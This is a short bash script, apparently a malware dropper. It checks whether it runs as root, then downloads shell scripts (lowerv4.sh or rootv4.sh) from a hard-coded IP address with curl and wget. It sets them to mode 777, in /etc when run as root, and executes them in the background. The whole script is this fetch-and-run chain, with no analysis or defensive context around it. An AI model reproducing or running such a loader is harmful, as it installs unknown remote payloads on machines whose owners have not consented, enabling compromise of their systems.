#!/bin/bash
whoami=$( whoami )
if [ ${whoami}x != "root"x ];then
	curl http://69.165.65.252/lowerv4.sh>lowerv4.sh
	wget http://69.165.65.252/lowerv4.sh
	rm lowerv4.sh.*
    chmod 777 lowerv4.sh
    bash lowerv4.sh &
else
	curl http://69.165.65.252/lowerv4.sh>/etc/lowerv4.sh
	wget -P /etc/ http://69.165.65.252/rootv4.sh
	rm /etc/rootv4.sh.*
    chmod 777 /etc/rootv4.sh
    bash /etc/rootv4.sh &
fi
echo "over"
